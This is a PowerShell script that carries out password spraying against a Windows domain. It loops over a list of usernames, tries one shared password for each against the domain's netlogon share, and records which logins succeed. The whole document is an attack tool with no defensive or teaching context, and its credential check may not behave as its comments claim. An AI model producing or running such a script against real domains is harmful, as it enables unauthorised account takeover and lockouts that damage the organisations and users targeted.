# Input parameters
$Domain = "yourdomain.com"           # Replace with your domain
$Password = "Password123"             # Replace with the password to test
$UsersFile = "C:\path\to\users.txt"   # File containing the usernames, one per line
$ResultsFile = "C:\path\to\results.txt"  # File to store results

# Import users from file
$Users = Get-Content -Path $UsersFile

# Initialize an array to store results
$Results = @()

foreach ($User in $Users) {
    # Form the username as DOMAIN\User
    $Username = "$Domain\$User"
    
    # Attempt to create a credential object
    $SecurePassword = ConvertTo-SecureString -String $Password -AsPlainText -Force
    $Credential = New-Object System.Management.Automation.PSCredential($Username, $SecurePassword)

    # Try to authenticate using Test-Connection or an SMB-based check (like Test-Path)
    try {
        # Test with Test-Path using a network share (replace with a valid path in your environment)
        if (Test-Path -Path "\\$Domain\netlogon" -Credential $Credential) {
            # Success
            Write-Host "[+] Successful login: $Username" -ForegroundColor Green
            $Results += "$Username : Success"
        }
        else {
            # Failure
            Write-Host "[-] Failed login: $Username" -ForegroundColor Red
            $Results += "$Username : Failed"
        }
    }
    catch {
        # Catch any errors
        Write-Host "[-] Error for user: $Username" -ForegroundColor Yellow
        $Results += "$Username : Error"
    }
}

# Save results to file
$Results | Out-File -FilePath $ResultsFile -Encoding UTF8
Write-Host "Password spraying complete. Results saved to $ResultsFile" -ForegroundColor Cyan
